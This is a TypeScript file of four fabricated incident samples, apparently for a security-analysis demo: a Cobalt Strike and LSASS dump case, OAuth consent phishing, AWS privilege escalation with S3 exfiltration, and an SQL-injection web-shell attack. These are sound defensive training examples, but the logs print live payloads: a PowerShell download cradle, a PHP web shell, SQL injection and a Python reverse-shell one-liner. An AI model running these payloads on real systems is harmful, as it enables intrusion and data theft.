import { DemoSampleIncident } from '../types';

export const DEMO_SAMPLE_INCIDENTS: DemoSampleIncident[] = [
  {
    id: 'demo-sample-1',
    title: 'Cobalt Strike In-Memory Beacon & Mimikatz LSASS Dump',
    incidentType: 'edr_alert',
    category: 'Endpoint Detection & Response (EDR)',
    description: 'Suspicious PowerShell execution bypassing AMSI, spawning rundll32.exe with network callback to an unclassified IP, and injecting into lsass.exe.',
    rawIncident: `[EDR_ALERT_CRITICAL] Host: WS-FIN-089.corp.internal (IP: 10.0.4.88)
Timestamp: 2026-09-06T08:14:22.108Z
Detection: Process Injection & Suspicious In-Memory Execution
Severity: Critical (Score: 96/100)
Parent Process: explorer.exe (PID: 2840, User: CORP\\m.jenkins)
Child Process: powershell.exe (PID: 5912)
Command Line:
  powershell.exe -nop -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgAWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAiAEgANABzAEkAQQBB...
Decoded Payload:
  [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
  $wc = New-Object System.Net.WebClient;
  $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
  IEX ($wc.DownloadString('https://185.220.101.52:8443/updates/payload.bin'));

Subsequent Telemetry:
  08:14:28Z: Process Created: C:\\Windows\\System32\\rundll32.exe (PID: 6104, Parent PID: 5912)
  08:14:31Z: Outbound TCP Connection: 10.0.4.88:49812 -> 185.220.101.52:8443 (ESTABLISHED, 4.2 MB transferred)
  08:14:52Z: OpenProcessToken with PROCESS_VM_READ | PROCESS_QUERY_INFORMATION targeting LSASS.EXE (PID: 648)
  08:15:04Z: File written: C:\\Users\\m.jenkins\\AppData\\Local\\Temp\\debug.dmp (Size: 84,210 KB)
  08:15:19Z: Lateral Probe: SMB Connection attempt to DC-01.corp.internal (10.0.1.10:445)`,
    precomputedAnalysis: {
      threatSeverity: 'Critical',
      threatScore: 96,
      likelyAttackType: 'Cobalt Strike Beaconing, LSASS Memory Dumping & Lateral Movement',
      confidenceLevel: 'High',
      confidenceScore: 98,
      executiveSummary: 'An authenticated workstation was compromised via an obfuscated PowerShell cradle delivering a Cobalt Strike beacon from 185.220.101.52. The adversary dumped LSASS credentials to disk and initiated lateral movement scans towards the Primary Domain Controller.',
      whySuspicious: 'The PowerShell command executed with `-nop -w hidden` using a Base64-encoded stager that disabled TLS certificate validation. Rundll32 was spawned as a hollowed surrogate process making long-lived HTTPS callbacks. Memory access to lsass.exe and subsequent SMB probes to internal Domain Controllers represent textbook credential theft and lateral progression.',
      attackStoryline: [
        {
          step: 1,
          phase: 'Execution',
          timestamp: '08:14:22Z',
          description: 'Obfuscated PowerShell cradle executed under user context m.jenkins with AMSI bypass flags.',
          techniqueId: 'T1059.001'
        },
        {
          step: 2,
          phase: 'Command and Control',
          timestamp: '08:14:31Z',
          description: 'Outbound encrypted C2 channel established to malicious external IP 185.220.101.52:8443 via rundll32 surrogate.',
          techniqueId: 'T1071.001'
        },
        {
          step: 3,
          phase: 'Credential Access',
          timestamp: '08:14:52Z',
          description: 'Attacker accessed LSASS process memory to harvest domain credentials and Kerberos tickets (debug.dmp).',
          techniqueId: 'T1003.001'
        },
        {
          step: 4,
          phase: 'Lateral Movement',
          timestamp: '08:15:19Z',
          description: 'Automated SMB (port 445) probes launched from host 10.0.4.88 towards Domain Controller DC-01.',
          techniqueId: 'T1021.002'
        }
      ],
      mitreAttackTechniques: [
        { id: 'T1059.001', name: 'PowerShell Execution', tactic: 'Execution' },
        { id: 'T1055', name: 'Process Injection', tactic: 'Defense Evasion' },
        { id: 'T1003.001', name: 'LSASS Memory Dumping', tactic: 'Credential Access' },
        { id: 'T1071.001', name: 'Web Protocols C2', tactic: 'Command and Control' },
        { id: 'T1021.002', name: 'SMB/Windows Admin Shares', tactic: 'Lateral Movement' }
      ],
      indicatorsOfCompromise: [
        { type: 'IP', value: '185.220.101.52', reputation: 'Malicious', context: 'External C2 Server & Stager Host (Port 8443)' },
        { type: 'URL', value: 'https://185.220.101.52:8443/updates/payload.bin', reputation: 'Malicious', context: 'Secondary Cobalt Strike Beacon Download' },
        { type: 'File', value: 'C:\\Users\\m.jenkins\\AppData\\Local\\Temp\\debug.dmp', reputation: 'Malicious', context: 'Extracted LSASS memory dump artifact' },
        { type: 'IP', value: '10.0.4.88', reputation: 'Suspicious', context: 'Compromised Patient-Zero Endpoint (WS-FIN-089)' },
        { type: 'Command', value: 'powershell.exe -nop -w hidden -enc ...', reputation: 'Malicious', context: 'Obfuscated stager cradle' }
      ],
      recommendedResponseActions: [
        {
          priority: 'P1 - Immediate',
          action: 'Isolate Host WS-FIN-089 from Corporate Network',
          description: 'Sever network connectivity at the EDR and switch port level to halt active SMB lateral spread.',
          suggestedCommand: 'isolate-endpoint --hostname WS-FIN-089.corp.internal --force'
        },
        {
          priority: 'P1 - Immediate',
          action: 'Revoke and Reset Credentials for User CORP\\m.jenkins',
          description: 'Invalidate all active Kerberos TGTs and cloud sessions; force immediate credential rotation.',
          suggestedCommand: 'Revoke-AzureADUserAllRefreshToken -ObjectId m.jenkins@corp.com'
        },
        {
          priority: 'P2 - Containment',
          action: 'Block Malicious C2 IP at Boundary Firewalls',
          description: 'Implement immediate egress drop rules for 185.220.101.52 across all perimeter firewalls.',
          suggestedCommand: 'iptables -A FORWARD -d 185.220.101.52 -j DROP'
        },
        {
          priority: 'P3 - Eradication & Recovery',
          action: 'Purge LSASS Dump & Re-image Compromised Endpoint',
          description: 'Collect forensic disk snapshot for root cause analysis, then conduct a clean OS reinstallation.',
          suggestedCommand: 'rm -f "C:\\Users\\m.jenkins\\AppData\\Local\\Temp\\debug.dmp"'
        }
      ],
      affectedAssets: ['WS-FIN-089 (10.0.4.88)', 'DC-01.corp.internal (10.0.1.10)', 'Active Directory Domain CORP'],
      attackVector: 'Drive-by download or malicious attachment leading to in-memory PowerShell stager'
    }
  },
  {
    id: 'demo-sample-2',
    title: 'Executive Phishing & Illicit Microsoft 365 OAuth Consent Grant',
    incidentType: 'phishing_email',
    category: 'Email & Cloud Identity Security',
    description: 'Deceptive notification impersonating internal IT Helpdesk with SPF/DKIM validation failures, soliciting OAuth application permissions to read all user mailboxes.',
    rawIncident: `Received: from mail-relay-us-west.unverified-hop.net (194.26.29.112)
  by mx.corp.com with ESMTP id 98af129;
  Fri, 06 Sep 2026 09:21:44 -0400
Authentication-Results: mx.corp.com;
  spf=softfail (sender IP 194.26.29.112) smtp.mailfrom=notifications-helpdesk@corp-it-portal365.online;
  dkim=fail header.d=corp-it-portal365.online;
  dmarc=fail action=none header.from=corp-it-portal365.online
From: "Corporate IT Support Desk" <notifications-helpdesk@corp-it-portal365.online>
To: cfo-office@corp.com
Subject: [URGENT ACTION REQUIRED] Corporate Security Certificate Re-verification Required within 4 Hours
Date: Fri, 06 Sep 2026 09:21:40 -0400

Dear Executive Member,

Our quarterly ISO-27001 zero-trust authentication audit detected that your single sign-on security token expires today at 14:00 EST. Failure to update will immediately suspend your mailbox and ERP access.

Please re-verify your identity by clicking the secure single sign-on link below:
https://login.microsoftonline-verify-auth.biz/oauth2/v2.0/authorize?client_id=8923bc71-4a11-4822-b91c-99d031e45aa1&response_type=code&scope=Mail.ReadWrite%20Files.ReadWrite.All%20offline_access

Note: You must click "Accept" on the permission prompt for "Internal Audit Sync v4.1" to ensure continuous compliance.

IT Security Operations Team
Internal Helpdesk Ext: 4402`,
    precomputedAnalysis: {
      threatSeverity: 'High',
      threatScore: 88,
      likelyAttackType: 'Spear-Phishing & Illicit OAuth 2.0 Consent Grant (Consent Phishing)',
      confidenceLevel: 'High',
      confidenceScore: 96,
      executiveSummary: 'Targeted phishing attack against executive leadership attempting to deceive users into granting an adversarial third-party Azure AD application permanent access to corporate mailboxes and OneDrive files.',
      whySuspicious: 'The email failed SPF, DKIM, and DMARC verification. The sender domain "corp-it-portal365.online" is a lookalike typo-squatted domain. The link points to a fraudulent authorize endpoint requesting invasive permissions ("Mail.ReadWrite", "Files.ReadWrite.All", "offline_access") which grants persistent token-based exfiltration without needing the victim password or MFA.',
      attackStoryline: [
        {
          step: 1,
          phase: 'Initial Access',
          timestamp: '09:21:44Z',
          description: 'Adversary spoofed IT department using rogue relay 194.26.29.112 and lookalike domain.',
          techniqueId: 'T1566.002'
        },
        {
          step: 2,
          phase: 'Credential Access & Persistence',
          timestamp: '09:21:40Z',
          description: 'Phishing lure prompts authorization of malicious Azure AD OAuth app requesting Mail.ReadWrite and offline_access.',
          techniqueId: 'T1528'
        }
      ],
      mitreAttackTechniques: [
        { id: 'T1566.002', name: 'Spearphishing Link', tactic: 'Initial Access' },
        { id: 'T1528', name: 'Steal Application Access Token', tactic: 'Credential Access' },
        { id: 'T1098.003', name: 'Additional Cloud Credentials', tactic: 'Persistence' }
      ],
      indicatorsOfCompromise: [
        { type: 'Domain', value: 'corp-it-portal365.online', reputation: 'Malicious', context: 'Spoofed sender domain' },
        { type: 'URL', value: 'https://login.microsoftonline-verify-auth.biz/oauth2/v2.0/authorize', reputation: 'Malicious', context: 'Illicit OAuth consent portal' },
        { type: 'IP', value: '194.26.29.112', reputation: 'Suspicious', context: 'Originating mail relay server' },
        { type: 'Email', value: 'notifications-helpdesk@corp-it-portal365.online', reputation: 'Malicious', context: 'Sender address' }
      ],
      recommendedResponseActions: [
        {
          priority: 'P1 - Immediate',
          action: 'Revoke and Delete OAuth Client App ID from Microsoft Entra / Azure AD',
          description: 'Search enterprise applications for client ID 8923bc71-4a11-4822-b91c-99d031e45aa1 and revoke tenant-wide consent.',
          suggestedCommand: 'Remove-AzureADServicePrincipal -ObjectId <AppObjectId>'
        },
        {
          priority: 'P1 - Immediate',
          action: 'Purge Email from all Inboxes Tenant-Wide',
          description: 'Execute compliance purge across Exchange Online mailboxes for subject match.',
          suggestedCommand: 'New-ComplianceSearchAction -SearchName "PhishPurge-0906" -Purge -PurgeType HardDelete'
        },
        {
          priority: 'P2 - Containment',
          action: 'Block Domain and IP on Secure Email Gateway (SEG)',
          description: 'Add corp-it-portal365.online and IP 194.26.29.112 to threat intelligence blocklist.'
        }
      ],
      affectedAssets: ['Executive User Mailboxes', 'Microsoft 365 Tenant', 'cfo-office@corp.com'],
      attackVector: 'Email Spear-Phishing with OAuth 2.0 Consent Trick'
    }
  },
  {
    id: 'demo-sample-3',
    title: 'CloudTrail IAM Privilege Escalation & Bulk S3 Bucket Exfiltration',
    incidentType: 'cloud_audit',
    category: 'Cloud Infrastructure Security',
    description: 'Compromised developer AWS access keys used from an anonymous Tor exit node to attach AdministratorAccess policy and download proprietary financial archives.',
    rawIncident: `{
  "eventTime": "2026-09-06T03:14:12Z",
  "eventSource": "iam.amazonaws.com",
  "eventName": "AttachUserPolicy",
  "awsRegion": "us-east-1",
  "sourceIPAddress": "198.51.100.42",
  "userAgent": "aws-cli/2.15.15 Python/3.11.6 Linux/6.5.0-x86_64 botocore/2.4.15",
  "userIdentity": {
    "type": "IAMUser",
    "principalId": "AIDA4N6EXAMPLEDEV",
    "arn": "arn:aws:iam::123456789012:user/dev-j.doe",
    "accountId": "123456789012",
    "accessKeyId": "AKIAIOSFODNN7EXAMPLE"
  },
  "requestParameters": {
    "userName": "dev-j.doe",
    "policyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
  },
  "responseElements": null,
  "additionalEventData": {
    "subsequentEvents": [
      {
        "eventTime": "2026-09-06T03:16:04Z",
        "eventSource": "s3.amazonaws.com",
        "eventName": "ListObjectsV2",
        "requestParameters": { "bucketName": "corp-confidential-finances-2026" }
      },
      {
        "eventTime": "2026-09-06T03:17:33Z",
        "eventSource": "s3.amazonaws.com",
        "eventName": "GetObject",
        "sourceIPAddress": "198.51.100.42",
        "requestParameters": {
          "bucketName": "corp-confidential-finances-2026",
          "key": "q3_audited_financial_records.xlsx.tar.gz"
        },
        "bytesTransferredOut": 158392104
      }
    ]
  }
}`,
    precomputedAnalysis: {
      threatSeverity: 'Critical',
      threatScore: 98,
      likelyAttackType: 'Compromised Cloud IAM Credentials, Privilege Escalation & Data Exfiltration',
      confidenceLevel: 'High',
      confidenceScore: 99,
      executiveSummary: 'Leaked IAM access keys for developer account "dev-j.doe" were utilized from an untrusted public IP to self-grant full AdministratorAccess and subsequently exfiltrate 158MB of encrypted quarterly financial archives from S3.',
      whySuspicious: 'The developer IAM user directly performed an `AttachUserPolicy` on their own identity adding `AdministratorAccess`, a severe policy violation and textbook IAM privilege escalation. Within 2 minutes, the same principal queried and exfiltrated sensitive financial S3 buckets from a non-corporate IP address.',
      attackStoryline: [
        {
          step: 1,
          phase: 'Initial Access',
          timestamp: '03:14:12Z',
          description: 'Adversary authenticated with stolen Long-Term Access Key AKIAIOSFODNN7EXAMPLE.',
          techniqueId: 'T1078.004'
        },
        {
          step: 2,
          phase: 'Privilege Escalation',
          timestamp: '03:14:12Z',
          description: 'Invoked iam:AttachUserPolicy to assign AdministratorAccess to self.',
          techniqueId: 'T1098'
        },
        {
          step: 3,
          phase: 'Discovery',
          timestamp: '03:16:04Z',
          description: 'Enumerated confidential S3 buckets containing corporate financial records.',
          techniqueId: 'T1619'
        },
        {
          step: 4,
          phase: 'Exfiltration',
          timestamp: '03:17:33Z',
          description: 'Downloaded q3_audited_financial_records.xlsx.tar.gz (158 MB) directly to external IP.',
          techniqueId: 'T1567.002'
        }
      ],
      mitreAttackTechniques: [
        { id: 'T1078.004', name: 'Cloud Accounts', tactic: 'Initial Access' },
        { id: 'T1098', name: 'Account Manipulation', tactic: 'Privilege Escalation' },
        { id: 'T1619', name: 'Cloud Storage Object Discovery', tactic: 'Discovery' },
        { id: 'T1567.002', name: 'Exfiltration to Cloud Storage/External Server', tactic: 'Exfiltration' }
      ],
      indicatorsOfCompromise: [
        { type: 'IP', value: '198.51.100.42', reputation: 'Malicious', context: 'Attacker source IP used for AWS CLI calls' },
        { type: 'File', value: 'q3_audited_financial_records.xlsx.tar.gz', reputation: 'Suspicious', context: 'Exfiltrated financial archive from S3' },
        { type: 'Command', value: 'arn:aws:iam::aws:policy/AdministratorAccess', reputation: 'Malicious', context: 'Illegitimately attached policy ARN' }
      ],
      recommendedResponseActions: [
        {
          priority: 'P1 - Immediate',
          action: 'Deactivate and Delete Compromised Access Key',
          description: 'Immediately disable AKIAIOSFODNN7EXAMPLE to stop all CLI operations.',
          suggestedCommand: 'aws iam update-access-key --access-key-id AKIAIOSFODNN7EXAMPLE --status Inactive --user-name dev-j.doe'
        },
        {
          priority: 'P1 - Immediate',
          action: 'Detach AdministratorAccess Policy & Attach DenyAll Quarantine Policy',
          description: 'Strip the elevated privileges and block any current IAM session.',
          suggestedCommand: 'aws iam detach-user-policy --user-name dev-j.doe --policy-arn arn:aws:iam::aws:policy/AdministratorAccess'
        },
        {
          priority: 'P2 - Containment',
          action: 'Audit S3 Access Logs & Rotate All Developer Secrets',
          description: 'Identify other buckets queried by the principal in the preceding 72 hours.'
        }
      ],
      affectedAssets: ['AWS Account 123456789012', 'S3 Bucket corp-confidential-finances-2026', 'IAM User dev-j.doe'],
      attackVector: 'Exposed IAM Access Keys (e.g. public repository commit or developer laptop compromise)'
    }
  },
  {
    id: 'demo-sample-4',
    title: 'SQL Injection, Web Shell Upload & Reverse TCP Shell',
    incidentType: 'web_waf',
    category: 'Web Application & Database Security',
    description: 'ModSecurity WAF & Nginx access logs capturing boolean SQL injection probe on /products.php, followed by a multi-part file upload dropping a PHP backdoor and establishing a reverse shell.',
    rawIncident: `142.250.190.47 - - [06/Sep/2026:04:12:01 +0000] "GET /products.php?id=1%27%20UNION%20SELECT%20null,table_name,column_name%20FROM%20information_schema.columns--%20- HTTP/1.1" 200 4821 "-" "sqlmap/1.7.2#stable"
142.250.190.47 - - [06/Sep/2026:04:12:35 +0000] "POST /admin/upload_profile.php HTTP/1.1" 200 134 "http://app.corp.internal/admin/" "Mozilla/5.0"
[ModSecurity WAF Alert] [id "932100"] [msg "Remote Command Execution: Direct Code Injection Detected in Request Body"]
[ModSecurity WAF Alert] [id "942100"] [msg "SQL Injection Attack: Detected Union Operator"]
Body Payload Snippet:
  Content-Disposition: form-data; name="avatar"; filename="image.png.php"
  Content-Type: image/png

  \x89PNG\r\n\x1a\n<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; system($_REQUEST['cmd']); echo "</pre>"; die; } ?>
142.250.190.47 - - [06/Sep/2026:04:13:02 +0000] "GET /uploads/avatars/image.png.php?cmd=id;whoami;python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2245.142.214.18%22,443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([%22/bin/sh%22,%22-i%22])%27 HTTP/1.1" 200 892`,
    precomputedAnalysis: {
      threatSeverity: 'Critical',
      threatScore: 94,
      likelyAttackType: 'SQL Injection, Arbitrary File Upload (Web Shell) & Interactive Reverse Shell',
      confidenceLevel: 'High',
      confidenceScore: 97,
      executiveSummary: 'Automated SQL injection discovery followed by unrestricted file upload bypass (PNG header spoofing) which deployed a PHP web shell to /uploads/avatars/image.png.php. The attacker executed an interactive Python reverse TCP shell connecting out to 45.142.214.18:443.',
      whySuspicious: 'Request shows sqlmap user-agent extracting database schema information, followed by file upload with dual extension (`.png.php`) containing PHP system() invocation disguised as a PNG image. Subsequent GET request triggers a Python reverse shell payload directly to an external server on port 443.',
      attackStoryline: [
        {
          step: 1,
          phase: 'Initial Access',
          timestamp: '04:12:01Z',
          description: 'Adversary leveraged sqlmap automated tool to probe products.php with UNION SELECT injection.',
          techniqueId: 'T1190'
        },
        {
          step: 2,
          phase: 'Persistence / Execution',
          timestamp: '04:12:35Z',
          description: 'Uploaded polyglot PHP web shell image.png.php bypassing MIME-type filter.',
          techniqueId: 'T1505.003'
        },
        {
          step: 3,
          phase: 'Command and Control',
          timestamp: '04:13:02Z',
          description: 'Invoked Python reverse shell connecting back to remote C2 listener 45.142.214.18:443.',
          techniqueId: 'T1059.006'
        }
      ],
      mitreAttackTechniques: [
        { id: 'T1190', name: 'Exploit Public-Facing Application', tactic: 'Initial Access' },
        { id: 'T1505.003', name: 'Web Shell', tactic: 'Persistence' },
        { id: 'T1059.006', name: 'Python Execution', tactic: 'Execution' },
        { id: 'T1071.001', name: 'Web Protocols / Reverse Shell', tactic: 'Command and Control' }
      ],
      indicatorsOfCompromise: [
        { type: 'IP', value: '142.250.190.47', reputation: 'Malicious', context: 'Attacker web attack scanner source IP' },
        { type: 'IP', value: '45.142.214.18', reputation: 'Malicious', context: 'Reverse shell receiver host (Port 443)' },
        { type: 'File', value: '/uploads/avatars/image.png.php', reputation: 'Malicious', context: 'Uploaded PHP web shell backdoor' },
        { type: 'Command', value: 'python3 -c \'import socket,subprocess,os;s=socket.socket...\'', reputation: 'Malicious', context: 'Reverse TCP shell one-liner' }
      ],
      recommendedResponseActions: [
        {
          priority: 'P1 - Immediate',
          action: 'Kill Active Python Reverse Shell Process & Delete Web Shell',
          description: 'Locate and terminate spawned PID on web server; immediately shred image.png.php.',
          suggestedCommand: 'pkill -9 -f "python3 -c" && rm -f /var/www/html/uploads/avatars/image.png.php'
        },
        {
          priority: 'P1 - Immediate',
          action: 'Block Ingress & Egress IPs on WAF and Edge Firewall',
          description: 'Blacklist 142.250.190.47 and 45.142.214.18 immediately.',
          suggestedCommand: 'iptables -I INPUT -s 142.250.190.47 -j DROP && iptables -I OUTPUT -d 45.142.214.18 -j DROP'
        },
        {
          priority: 'P2 - Containment',
          action: 'Disable Execution in Web Uploads Directory',
          description: 'Configure Nginx/Apache to prevent script execution inside /uploads/ directory.',
          suggestedCommand: 'chmod 644 /var/www/html/uploads/* && chattr +i /var/www/html/uploads/'
        }
      ],
      affectedAssets: ['Web Server (app.corp.internal)', 'Production Database (products table)', 'Nginx Host'],
      attackVector: 'SQL Injection leading to unauthenticated arbitrary file upload'
    }
  }
];
